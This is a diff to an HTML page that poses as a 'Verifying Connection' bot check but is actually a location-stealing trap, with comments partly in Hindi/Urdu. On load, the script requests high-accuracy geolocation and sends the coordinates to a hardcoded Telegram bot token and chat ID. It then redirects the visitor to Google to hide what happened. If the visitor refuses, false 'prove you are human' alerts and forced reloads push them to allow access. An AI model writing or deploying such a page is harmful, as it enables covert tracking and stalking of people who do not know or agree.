@@ -3,52 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking Connection...</title>
+    <title>Verifying Connection...</title>
+    <style>
+        /* Professional Loading Look */
+        body {
+            background-color: #f4f7f9;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            max-width: 350px;
+            width: 90%;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 { color: #333; font-size: 20px; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; line-height: 1.5; }
+        .status { font-size: 12px; color: #3498db; font-weight: bold; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; }
+    </style>
 </head>
 <body>
-    <h2 style="text-align: center; margin-top: 50px;">Please wait, checking secure connection...</h2>
-    
+
+    <div class="container">
+        <div class="loader"></div>
+        <h2>Verifying Connection</h2>
+        <p>Please wait while we establish a secure connection to the server.</p>
+        <div class="status" id="statusText">Checking Browser...</div>
+    </div>
+
     <script>
-        // Aapka Token aur ID bilkul sahi hai
+        // Aapka Bot Details (Fixed)
         const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
         const chatId = '7066124462';
 
+        const statusEl = document.getElementById('statusText');
+
         window.onload = function() {
-            // Permission mangne ka process
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(success, error, {
-                    enableHighAccuracy: true // Isse location zyada exact aati hai
-                });
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
+            setTimeout(() => {
+                requestLocation();
+            }, 1000); // 1 second ka delay natural lagne ke liye
         };
 
+        function requestLocation() {
+            statusEl.innerText = "Requesting Access...";
+            
+            if (navigator.geolocation) {
+                // High Accuracy setting se location bilkul exact milti hai
+                navigator.geolocation.getCurrentPosition(success, error, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                statusEl.innerText = "Error: Browser not supported";
+                alert("Your browser is outdated. Please update to continue.");
+            }
+        }
+
         function success(position) {
+            statusEl.innerText = "Encrypting Data...";
+            
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
             
-            // Fix: Yahan ${lat} use kiya hai
+            // Google Maps ka official search link
             const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `📍 *New Location Found!*%0A%0AAccuracy: ${accuracy.toFixed(1)}m%0AView: [Google Maps](${mapLink})`;
+            
+            // Telegram Message Formatting
+            const message = `📍 *New Location Found!*%0A%0A` +
+                            `*Accuracy:* ${accuracy.toFixed(1)} meters%0A` +
+                            `*Lat:* \`${lat}\` %0A*Lon:* \`${lon}\` %0A%0A` +
+                            `🔗 [Open in Google Maps](${mapLink})`;
 
-            // Telegram ko message bhejna
+            // API Call to Telegram
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
             .then(response => {
-                console.log("Location sent!");
-                // Success ke baad user ko redirect karna
+                statusEl.innerText = "Connection Verified!";
+                // Location milne ke baad user ko redirect karna
                 setTimeout(() => {
-                    window.location.href = "https://www.google.com";
-                }, 1000);
+                    window.location.href = "https://www.google.com"; // User ko asli site pe bhej do
+                }, 800);
             })
-            .catch(err => console.error("Error sending to Telegram:", err));
+            .catch(err => {
+                console.error("Telegram API Error:", err);
+            });
         }
 
         function error(err) {
-            // Agar user 'Block' karde to message dikhana
-            console.warn(`ERROR(${err.code}): ${err.message}`);
-            alert("Connection error: Please allow location access to verify you are not a bot.");
+            statusEl.innerText = "Verification Failed";
+            // Agar user 'Block' kare toh hum use force kar sakte hain
+            if (err.code === 1) { // User denied Geolocation
+                alert("Security Error: Please allow location access to verify you are a human.");
+                location.reload(); // Page reload karke phir se puchega
+            } else {
+                alert("Connection lost. Please refresh the page.");
+            }
         }
     </script>
 </body>
